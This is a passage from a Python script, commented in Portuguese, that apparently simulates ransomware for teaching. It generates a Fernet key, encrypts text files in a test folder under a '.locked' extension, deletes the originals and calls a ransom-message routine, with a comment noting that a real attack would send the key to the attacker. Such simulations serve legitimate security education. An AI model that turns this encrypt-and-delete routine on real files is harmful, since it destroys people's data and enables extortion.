    print(f"\n {len(arquivos)} arquivos de teste criados em '{PASTA_TESTE}/'")


def gerar_chave() -> bytes:
    """Gera uma chave Fernet (AES-128 em modo CBC com HMAC-SHA256)."""
    chave = Fernet.generate_key()
    with open(ARQUIVO_CHAVE, "wb") as f:
        f.write(chave)
    print(f"\n Chave gerada e salva em: {ARQUIVO_CHAVE}")
    print(f"   Chave (base64): {chave.decode()}")
    return chave


def criptografar_arquivos(chave: bytes):
    """
    Simula a fase de criptografia do ransomware.
    Em um ataque real, a chave seria enviada ao servidor do atacante.
    """
    PASTA_CRIPTOGRAFADA.mkdir(exist_ok=True)
    fernet = Fernet(chave)
    metadados = {}

    arquivos = list(PASTA_TESTE.glob("*.txt"))
    if not arquivos:
        print(" Nenhum arquivo encontrado para criptografar.")
        return

    print("\n Iniciando criptografia...")
    for caminho in arquivos:
        dados_originais = caminho.read_bytes()
        dados_criptografados = fernet.encrypt(dados_originais)

        # Salva arquivo criptografado com extensão .locked
        nome_criptografado = caminho.name + ".locked"
        destino = PASTA_CRIPTOGRAFADA / nome_criptografado
        destino.write_bytes(dados_criptografados)

        # Remove o original (simulando o comportamento do ransomware)
        caminho.unlink()

        metadados[nome_criptografado] = caminho.name
        print(f"  [] {caminho.name} → {nome_criptografado}")

    # Salva metadados para a fase de descriptografia
    with open(ARQUIVO_METADADOS, "w") as f:
        json.dump(metadados, f, indent=2)

    exibir_mensagem_resgate()


